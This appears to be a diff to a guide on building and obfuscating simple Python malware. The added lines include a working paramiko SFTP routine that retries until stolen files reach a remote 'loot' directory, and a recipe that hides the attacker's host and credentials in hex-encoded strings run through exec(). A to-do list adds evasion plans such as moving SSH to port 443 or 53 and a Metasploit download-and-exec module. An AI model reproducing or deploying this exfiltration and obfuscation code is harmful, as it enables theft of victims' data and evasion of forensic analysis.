@@ -14,9 +14,26 @@ A guide on the build process, obfuscation techniques, and analysis of simple pyt
 
 ## Exfiltration Methods
 
-### SSH exfiltration using [Paramiko](https://www.paramiko.org/installing.html)
-The example script shown only uses SSH via the paramiko library to exfiltrate stolen data (for now at least). Below is a snippet of its usage:
+### SFTP exfiltration using [Paramiko](https://www.paramiko.org/installing.html)
+The example script shown only uses SFTP via the paramiko library to exfiltrate stolen data (for now at least). Below is a snippet of its usage:
 
+    def sftp_func(filepath):
+        success = False
+        while success == False:   # this will ensure continuous ssh calls  until the data is sent
+            try:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect({RHOST ip}, {RHOST listening port}, {RHOST ssh username}, {RHOST ssh password}, timeout=3)
+                sftp = client.open_sftp()
+        
+                destination_path = f'/home/{a}/loot/{os.path.basename(filepath)}'
+                sftp.put(filepath, destination_path)
+                success = True
+                
+            except paramiko.ssh_exception.NoValidConnectionsError:
+                pass
+            except OSError:
+                pass
 
 <br>
 
@@ -26,6 +43,31 @@ The example script shown only uses SSH via the paramiko library to exfiltrate st
 <br>
 
 ## Code Obfuscation Techniques
+### Encoding variables
+In this example script, the arguments passed to the 'client.connect()' function (where client = paramiko.SSHClient()) are not human-readable, but instead obfuscated using layers of encoding. Below is an example of what this looks like:
+
+    # before encoding
+    b = "<remote ssh password>"
+    a = "<remote ssh username>"
+    c = "<server ip>"
+
+    # after encoding
+    yoyo = "\u0036\u0032\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0032\u0036\u0035\u0036\u0064\u0036\u0066\u0037\u0034\u0036\u0035\u0032\u0030\u0037\u0033\u0037\u0033\u0036\u0038\u0032\u0030\u0037\u0030\u0036\u0031\u0037\u0033\u0037\u0033\u0037\u0037\u0036\u0066\u0037\u0032\u0036\u0034\u0033\u0065\u0032\u0032\u0030\u0061\u0036\u0031\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0032\u0036\u0035\u0036\u0064\u0036\u0066\u0037\u0034\u0036\u0035\u0032\u0030\u0037\u0033\u0037\u0033\u0036\u0038\u0032\u0030\u0037\u0035\u0037\u0033\u0036\u0035\u0037\u0032\u0036\u0065\u0036\u0031\u0036\u0064\u0036\u0035\u0033\u0065\u0032\u0032\u0030\u0061\u0036\u0033\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0033\u0036\u0035\u0037\u0032\u0037\u0036\u0036\u0035\u0037\u0032\u0032\u0030\u0036\u0039\u0037\u0030\u0033\u0065\u0032\u0032"
+
+    ...
+    # usage in SFTP call
+    exec(bytes.fromhex(yoyo), globals())   # converts the hexidecimal string to meaningful variables, python understands escape unicode chars (e.g. \u0036)
+    client.connect(c, 22, a, b, timeout=4)
+    ...
+
+Pasting the original text into [Cyberchef](https://gchq.github.io/CyberChef/) and applying the following operations yields the illegible string 'yoyo': 
+- To Hex, No delimiter
+- Escape Unicode Chars, Padding: 4, Encode all chars
+
+However, it should be noted that this is a very crude technique as encoded characters are immediately recognizable to skilled forensic analysts and can be easily undone with several decoding tools. That said, when used in tandem with other obfuscation techniques, encoding can slightly delay reverse engineering efforts.
+
+<br>
+
 ### Using [Pyarmor](https://pypi.org/project/pyarmor/)
 To apply basic code obfuscation:
 > pyarmor gen example.py
@@ -54,6 +96,7 @@ To apply basic code obfuscation:
 <br>
 
 ## To-do List
+- change ssh port to 443 or 53
 - Metasploit download+exec module
 - .py to .pdf
 - smtp exfiltration
